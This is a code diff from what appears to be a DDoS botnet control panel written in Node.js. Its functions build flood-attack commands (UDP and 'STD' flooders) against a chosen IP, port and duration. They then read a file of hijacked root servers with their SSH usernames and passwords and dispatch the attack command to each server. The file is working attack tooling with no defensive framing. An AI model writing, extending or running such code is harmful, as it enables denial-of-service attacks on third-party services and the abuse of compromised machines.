@@ -48,18 +48,28 @@ exports.MethodValidation = function(method) {
 
 exports.GetCommand = function(ip, port, time, method) {
     switch(method) { 
-        case "DVR":
-            return "./dvr " + ip + " " + port + " dvr.txt 5 -1 " + time + ";wall 'attack sent'";
+        case "UDP":
+            return "python ./UDPMIX.py " + ip + " " + port + " " + time + ";wall skid";
+        case "STD":
+            return "./STD " + ip + " " + port + " " + time + ";wall skid";
     }
 }
 
-exports.SendSSHCmd = function(serverip, serveruser, serverpw, cmd) {
-    dis.exec('./dvr 70.70.70.72 80 dvr.txt 5 -1 70; wall skid', {
-        user: 'gang',
-        host: '194.34.134.15',
-        key: "",
-        password: ''
-      })
+exports.SendSSHCmd = function(ip, port, time, method) {
+    let roots = (fs.readFileSync("./CNC/db/bots/roots.txt", "utf8")).split("\n");
+    cmmd = dis.GetCommand(ip, port, time, method);
+    roots.forEach(e => {
+        if(e.length > 5) {
+            info = (((e.split("('").join("")).split("')").join("")).split("','").join(",")).split(",")
+            console.log(info)
+            SSH(cmmd, {
+                user: info[1],
+                host: info[0],
+                key: "",
+                password: info[2]
+            }).pipe(process.stdout)
+        }
+    })
 }
 
 exports.rootCOUNT = function() {
